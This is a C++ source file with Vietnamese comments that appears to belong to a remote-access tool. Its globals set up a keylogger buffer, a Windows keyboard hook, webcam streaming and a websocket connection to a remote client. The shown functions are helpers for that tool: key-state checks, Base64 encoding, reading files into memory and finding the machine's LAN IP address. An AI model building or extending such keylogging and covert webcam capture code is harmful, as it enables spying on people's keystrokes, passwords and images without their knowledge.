#include "Global.h"

// ĐỊNH NGHĨA BIẾN TOÀN CỤC
std::string g_KeylogBuffer = "";
std::mutex g_LogMutex;
HHOOK g_hHook = NULL;
std::set<DWORD> g_PendingModifiers;
bool g_IsStreaming = false;
std::thread* g_WebcamThread = nullptr;

// Keylogger Mode
std::string g_KeylogMode = "buffer"; // Mặc định: buffer mode
server* g_ServerPtr = nullptr;
websocketpp::connection_hdl g_ClientHdl;
bool g_ClientConnected = false;

// TRIỂN KHAI HÀM TIỆN ÍCH
// Chuyển chuỗi sang chữ thường
std::string ToLower(std::string str) {
    std::transform(str.begin(), str.end(), str.begin(), [](unsigned char c) {
        return std::tolower(c);
        });
    return str;
}

// Kiểm tra phím có đang được giữ không
bool IsKeyDown(int vk) {
    return (GetAsyncKeyState(vk) & 0x8000) != 0;
}

// Base64 Encode
static const std::string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
std::string Base64Encode(unsigned char const* bytes_to_encode, unsigned int in_len) {
    std::string ret;
    int i = 0, j = 0;
    unsigned char char_array_3[3], char_array_4[4];

    while (in_len--) {
        char_array_3[i++] = *(bytes_to_encode++);
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;
            for (i = 0; (i < 4); i++) ret += base64_chars[char_array_4[i]];
            i = 0;
        }
    }
    if (i) {
        for (j = i; j < 3; j++) char_array_3[j] = '\0';
        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
        char_array_4[3] = char_array_3[2] & 0x3f;
        for (j = 0; (j < i + 1); j++) ret += base64_chars[char_array_4[j]];
        while ((i++ < 3)) ret += '=';
    }
    return ret;
}

// Đọc file ra buffer
std::vector<unsigned char> ReadFileToBuffer(const std::string& filepath) {
    std::ifstream file(filepath, std::ios::binary);
    if (!file.is_open()) return {};
    file.seekg(0, std::ios::end);
    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);
    if (size <= 0) return {};
    std::vector<unsigned char> buffer((size_t)size);
    if (file.read((char*)buffer.data(), size)) return buffer;
    return {};
}

// Hàm lấy IP LAN (IPv4)
std::string GetLocalIPAddress() {
    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) == SOCKET_ERROR) {
        return "Error";
    }

    struct hostent* hostinfo = gethostbyname(hostname);
    if (hostinfo == NULL) {
        return "Error";
    }

    // Duyệt qua danh sách IP (vì một máy có thể có nhiều card mạng)
    // Thường IP LAN chính sẽ nằm ở vị trí đầu tiên hoặc thứ hai
    for (int i = 0; hostinfo->h_addr_list[i] != 0; ++i) {
        struct in_addr addr;
        memcpy(&addr, hostinfo->h_addr_list[i], sizeof(struct in_addr));
        std::string ip = inet_ntoa(addr);

        // Lọc bớt IP localhost (127.0.0.1) nếu có, chỉ lấy IP mạng LAN
        if (ip != "127.0.0.1") {
            return ip;
        }
    }
    return "127.0.0.1"; // Fallback nếu không tìm thấy
}